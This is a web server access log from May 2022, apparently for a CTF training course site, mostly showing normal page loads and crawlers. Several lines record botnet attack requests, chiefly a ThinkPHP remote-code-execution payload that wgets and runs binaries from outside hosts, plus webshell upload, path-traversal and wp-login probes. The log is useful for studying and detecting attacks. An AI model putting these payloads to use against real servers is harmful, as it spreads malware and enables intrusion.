12.240.32.81 - - [15/May/2022:00:00:19 +0300] "GET /f2035be396/c7e9d9807d/5401 HTTP/1.1" 301 162 "-" "-"
250.133.213.113 - - [15/May/2022:05:07:35 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
246.39.148.14 - - [15/May/2022:05:07:35 +0300] "GET /crypto/pic/enigma.jpg HTTP/2.0" 200 90712 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
186.242.190.49 - - [15/May/2022:05:07:35 +0300] "GET /crypto/pic/aeneas_line.jpg HTTP/2.0" 200 287513 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
75.198.225.189 - - [15/May/2022:05:07:35 +0300] "GET /crypto/pic/skytale.png HTTP/2.0" 200 1381120 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
34.63.224.152 - - [15/May/2022:05:07:35 +0300] "GET /static/graphic/loupe.svg HTTP/2.0" 200 2981 "https://course.ugractf.ru/static/book-nav.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
61.47.218.44 - - [15/May/2022:05:07:35 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
142.56.20.2 - - [15/May/2022:05:07:35 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 200 152936 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
238.172.5.86 - - [15/May/2022:05:07:35 +0300] "GET /static/vollkorn/Vollkorn-Italic.woff2 HTTP/2.0" 200 135048 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
225.149.194.179 - - [15/May/2022:05:07:35 +0300] "GET /static/jb/jb.woff2?v=10.12 HTTP/2.0" 200 44688 "https://course.ugractf.ru/static/jb/jb.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
68.81.36.44 - - [15/May/2022:05:07:36 +0300] "GET /static/favicon.png HTTP/2.0" 200 551 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
116.222.229.139 - - [15/May/2022:05:09:34 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
232.163.41.236 - - [15/May/2022:05:13:39 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.239.147.201/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Uirusu/2.0"
113.53.8.254 - - [15/May/2022:05:14:18 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
96.151.166.29 - - [15/May/2022:05:14:30 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675"
176.242.195.26 - - [15/May/2022:05:14:31 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
28.229.70.210 - - [15/May/2022:05:14:50 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 8.1.0; 16th) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
108.138.102.219 - - [15/May/2022:05:15:03 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 8.1.0; 16th) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
68.73.149.212 - - [15/May/2022:05:15:20 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.133.60.152 - - [15/May/2022:05:15:20 +0300] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
94.32.5.231 - - [15/May/2022:05:16:52 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
170.211.25.155 - - [15/May/2022:05:19:13 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://payload.krakenbit.net/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.x86 -O /tmp/.db0fa4b8db0333367e9bda3ab68b8042; chmod 777 /tmp/.db0fa4b8db0333367e9bda3ab68b8042; /tmp/.db0fa4b8db0333367e9bda3ab68b8042 thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
155.83.24.66 - - [15/May/2022:05:19:18 +0300] "GET /reverse/task-b.html HTTP/2.0" 200 1950 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
65.178.174.11 - - [15/May/2022:05:20:44 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://payload.krakenbit.net/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.x86 -O /tmp/.db0fa4b8db0333367e9bda3ab68b8042; chmod 777 /tmp/.db0fa4b8db0333367e9bda3ab68b8042; /tmp/.db0fa4b8db0333367e9bda3ab68b8042 thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
70.213.4.214 - - [15/May/2022:05:23:32 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.173.148.8/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp Tsunami.ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
19.52.65.106 - - [15/May/2022:05:23:33 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.173.148.8/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp Tsunami.ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
182.58.203.104 - - [15/May/2022:05:31:27 +0300] "GET ///remote/fgt_lang?lang=/../../../..//////////dev/ HTTP/1.1" 404 146 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64"
222.164.221.236 - - [15/May/2022:05:32:56 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
15.58.33.130 - - [15/May/2022:05:35:57 +0300] "GET /robots.txt HTTP/1.1" 404 232 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
31.183.182.19 - - [15/May/2022:05:35:57 +0300] "GET /tasks/ossifrage/flag_iframe HTTP/1.1" 303 234 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.88.56.137 - - [15/May/2022:05:36:02 +0300] "GET /signup_iframe HTTP/1.1" 200 1626 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
212.82.211.148 - - [15/May/2022:05:36:02 +0300] "GET / HTTP/1.0" 301 162 "-" "-"
116.14.189.215 - - [15/May/2022:05:39:05 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://77.68.125.237/sicko_mode/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Uirusu/2.0"
186.164.80.192 - - [15/May/2022:05:46:38 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
98.229.107.33 - - [15/May/2022:05:47:22 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://144.172.70.166/bns/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "puzzles/2.0"
78.130.66.68 - - [15/May/2022:05:56:44 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
116.222.229.139 - - [15/May/2022:05:57:50 +0300] "GET /tasks/well/ HTTP/2.0" 404 146 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
32.254.79.130 - - [15/May/2022:05:57:50 +0300] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
76.39.84.27 - - [15/May/2022:05:57:50 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
83.44.254.235 - - [15/May/2022:05:59:56 +0300] "GET /merchant/code HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
60.203.149.13 - - [15/May/2022:05:59:56 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
159.114.32.187 - - [15/May/2022:05:59:56 +0300] "GET /merchant/code HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
91.237.106.40 - - [15/May/2022:05:59:57 +0300] "GET /merchant/code HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
157.234.187.3 - - [15/May/2022:05:59:57 +0300] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
26.60.111.159 - - [15/May/2022:05:59:57 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
181.128.32.114 - - [15/May/2022:05:59:58 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
98.146.124.126 - - [15/May/2022:05:59:58 +0300] "GET /3ds1633693954432212 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
232.207.58.233 - - [15/May/2022:05:59:58 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
72.58.203.187 - - [15/May/2022:05:59:58 +0300] "GET /3ds1633693954432212 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
59.68.151.37 - - [15/May/2022:05:59:58 +0300] "GET /3ds1633693954432212 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
106.121.206.176 - - [15/May/2022:05:59:59 +0300] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
16.97.20.15 - - [15/May/2022:05:59:59 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
198.22.219.70 - - [15/May/2022:05:59:59 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
241.180.99.143 - - [15/May/2022:05:59:59 +0300] "GET /3ds.php HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
117.98.150.73 - - [15/May/2022:05:59:59 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
114.46.239.113 - - [15/May/2022:05:59:59 +0300] "GET /3ds.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
143.0.56.30 - - [15/May/2022:06:00:00 +0300] "GET /3ds.php HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
52.98.196.165 - - [15/May/2022:06:00:00 +0300] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
119.140.246.247 - - [15/May/2022:06:00:00 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
102.136.69.204 - - [15/May/2022:06:00:00 +0300] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
23.179.42.216 - - [15/May/2022:06:05:46 +0300] "GET /forensics/ram.html HTTP/1.1" 200 8132 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
32.112.209.89 - - [15/May/2022:06:08:18 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
12.216.226.148 - - [15/May/2022:06:09:41 +0300] "HEAD / HTTP/1.1" 301 0 "-" "Go-http-client/1.1"
134.180.101.41 - - [15/May/2022:06:09:42 +0300] "HEAD / HTTP/2.0" 200 0 "http://ttc.tf" "Go-http-client/2.0"
55.169.203.21 - - [15/May/2022:06:09:43 +0300] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
93.168.207.159 - - [15/May/2022:06:09:44 +0300] "HEAD / HTTP/2.0" 200 0 "http://ttc.tf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
75.69.137.42 - - [15/May/2022:06:09:44 +0300] "GET / HTTP/2.0" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36"
190.89.196.172 - - [15/May/2022:06:14:11 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.124.84.135/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
237.232.185.110 - - [15/May/2022:06:15:58 +0300] "GET / HTTP/1.0" 200 415 "-" "-"
174.148.93.213 - - [15/May/2022:06:19:40 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
109.46.85.174 - - [15/May/2022:06:25:25 +0300] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
160.201.227.98 - - [15/May/2022:06:28:20 +0300] "GET / HTTP/2.0" 200 3946 "https://nevactf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
182.184.236.207 - - [15/May/2022:06:28:20 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
80.83.16.144 - - [15/May/2022:06:28:20 +0300] "GET /static/rating.js HTTP/2.0" 200 7270 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
47.223.2.185 - - [15/May/2022:06:28:20 +0300] "GET /static/graphic/logo_l.svg HTTP/2.0" 200 2841 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
136.14.56.252 - - [15/May/2022:06:28:20 +0300] "GET /static/graphic/cover.svg HTTP/2.0" 200 89221 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
106.81.125.85 - - [15/May/2022:06:28:20 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
87.42.149.225 - - [15/May/2022:06:28:20 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
194.139.67.55 - - [15/May/2022:06:28:20 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
238.151.2.63 - - [15/May/2022:06:28:20 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
162.255.126.199 - - [15/May/2022:06:28:20 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
211.9.21.148 - - [15/May/2022:06:28:20 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
225.228.152.195 - - [15/May/2022:06:28:20 +0300] "GET /static/graphic/loupe.svg HTTP/2.0" 200 2981 "https://course.ugractf.ru/static/book-nav.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
10.240.171.164 - - [15/May/2022:06:28:21 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
29.55.223.244 - - [15/May/2022:06:28:21 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 200 152936 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
229.142.151.86 - - [15/May/2022:06:28:21 +0300] "GET /static/vollkorn/Vollkorn-Italic.woff2 HTTP/2.0" 200 135048 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
56.137.44.80 - - [15/May/2022:06:28:21 +0300] "GET /scores?0.46297682579978083 HTTP/2.0" 200 118704 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
184.193.99.202 - - [15/May/2022:06:28:21 +0300] "GET /static/favicon.png HTTP/2.0" 200 551 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
252.176.48.194 - - [15/May/2022:06:29:15 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
131.24.250.33 - - [15/May/2022:06:31:33 +0300] "GET / HTTP/2.0" 200 3946 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
240.206.150.74 - - [15/May/2022:06:35:38 +0300] "GET /robots.txt HTTP/1.0" 404 146 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +https://help.mail.ru/webmaster/indexing/robots)"
127.218.114.119 - - [15/May/2022:06:35:39 +0300] "GET /crypto/asymmetric.html HTTP/1.1" 200 24653 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +https://help.mail.ru/webmaster/indexing/robots)"
147.206.106.74 - - [15/May/2022:06:38:02 +0300] "GET /pr/2020-05-01 HTTP/2.0" 200 3808 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
116.222.229.139 - - [15/May/2022:06:38:32 +0300] "GET /wp-login.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
179.182.169.25 - - [15/May/2022:06:38:32 +0300] "GET /wp-login.php HTTP/1.1" 200 1103 "http://xn--80ajpn0d.xn--80asehdb/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
52.115.18.79 - - [15/May/2022:06:40:22 +0300] "GET / HTTP/1.1" 200 5188 "https://ctf.upml.tech/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
118.206.90.80 - - [15/May/2022:06:40:23 +0300] "GET /wp-login.php HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
57.196.8.61 - - [15/May/2022:06:44:29 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
29.218.146.222 - - [15/May/2022:06:47:38 +0300] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
53.54.168.159 - - [15/May/2022:06:57:36 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
39.36.123.97 - - [15/May/2022:06:59:43 +0300] "GET /wp-login.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
102.197.93.30 - - [15/May/2022:06:59:44 +0300] "GET /wp-login.php HTTP/1.1" 404 146 "http://kettlec.tf/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
